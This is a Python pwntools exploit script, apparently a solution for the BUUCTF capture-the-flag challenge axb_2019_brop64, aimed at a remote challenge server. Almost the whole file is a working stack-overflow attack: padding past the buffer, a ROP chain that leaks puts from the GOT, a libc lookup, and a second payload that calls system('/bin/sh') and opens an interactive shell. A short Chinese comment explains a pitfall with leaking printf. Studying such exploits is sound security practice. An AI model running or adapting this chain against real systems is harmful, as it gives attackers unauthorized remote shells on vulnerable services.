#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 27241
elfpath = 'axb_2019_brop64'
ldpath = ''
libcpath = ''

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

# start pwning
'''
❯ checksec ./axb_2019_brop64
[*] '/home/leo/ctfs/ctfoj/BUUCTF/Pwn/axb_2019_brop64/axb_2019_brop64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
'''

pop_rdi = 0x400963
main_addr = 0x4007d6
e = ELF(elfpath)

payload1 = b'a'*0xD0
payload1 += b'a'*8
# 这里有个坑：如果是e.got['printf'] 的话，printf的地址的最低字节是b'\x00'，所以puts啥也得不到
payload1 += p64(pop_rdi) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(main_addr)
ru(b'Please tell me:')
s(payload1)

from LibcSearcher import *
puts = u64(ru7f()[-6:]+b'\x00'*2)
libc = LibcSearcher('puts', puts)

print(hex(libc.dump('printf'))) # 0x55800 
system = libc.dump('system') + puts - libc.dump('puts')
binsh = libc.dump('str_bin_sh') + puts - libc.dump('puts')
payload2 = b'a' * (0xd0 + 8)
payload2 += p64(pop_rdi) + p64(binsh) + p64(system) + p64(main_addr)
ru(b'Please tell me:')
s(payload2)

shell()


